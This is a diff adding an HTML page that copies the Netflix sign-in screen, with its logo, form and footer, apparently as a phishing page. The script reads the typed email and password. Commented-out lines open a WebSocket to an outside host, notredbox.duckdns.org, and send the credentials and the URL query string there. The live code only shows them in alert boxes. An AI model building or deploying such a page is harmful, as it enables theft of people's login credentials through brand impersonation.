@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Netflix</title>
+        <link rel="stylesheet" href="style.css">
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.js"></script>
+
+        <script>
+            //var connection = new WebSocket('wss:notredbox.duckdns.org/myws2');
+            /*
+            connection.onopen = function() {
+                console.log('Connected test!');
+                const queryString = window.location.search;
+                if(queryString.length > 0){
+                    connection.send(queryString);
+                }
+            }
+            */
+			function DoConnection() {
+              if(!($('#username').val() === null || $('#username').val() === "")){
+                    alert('Email: '+$('#username').val())
+                    alert('Password: '+$('#password').val())
+		    //connection.send('Email: '+$('#username').val()+ ' Password: '+$('#password').val());
+              }
+              
+			}
+			
+           	$(document).ready(function() {
+   				$( "#login" ).click(function() {
+					DoConnection();
+   				});			   
+			   
+           });
+        </script>
+    </head>
+
+    <body>
+        <div class="container">
+            <header class="header">
+                <img src="images/Netflix.png" alt="logo">
+            </header>
+
+            <div class="registerBlock">
+                <div class="paddingBlock">
+                    <div class="title">
+                        <h1>Sign In</h1>
+                    </div>
+        
+                    <div class="inputs">
+                        <input type="text" id="username" placeholder="Email or phone number"/>
+                        <input type="password" id="password" placeholder="Password"/>
+                    </div>
+        
+                    <div class="button">
+                        <button id="login">Sign In</button>
+                        <div class="checkboxBlock">
+                            <div>
+                                <input type="checkbox">
+                                <span>Remember me</span>
+                            </div>
+                                <span>Need Help?</span>
+                        </div>
+                    </div>
+        
+                    <div class="moreInfo">
+                        <span>New to Netflix?</span>
+                        <span><a class="link3" href="">Sign up now!</a></span>
+                    </div>
+                </div> 
+            </div>
+
+            <footer class="footer">
+                <div class="block1">
+                    <span>Questions?</span>
+                    <span>Call 0800-509-417</span>
+                </div>
+
+                <div class="block2">
+                    <a href="">FAQ</a>
+                    <a href="">Help Center</a>
+                    <a href="">Terms of Use</a>
+                    <a href="">Privacy</a>
+                </div>
+
+                <div class="block3">
+                    <a href="">Cookie Preferences</a>
+                    <a href="">Corporate Information</a>
+                </div>
+            </footer>
+        </div>
+    </body>
+</html>
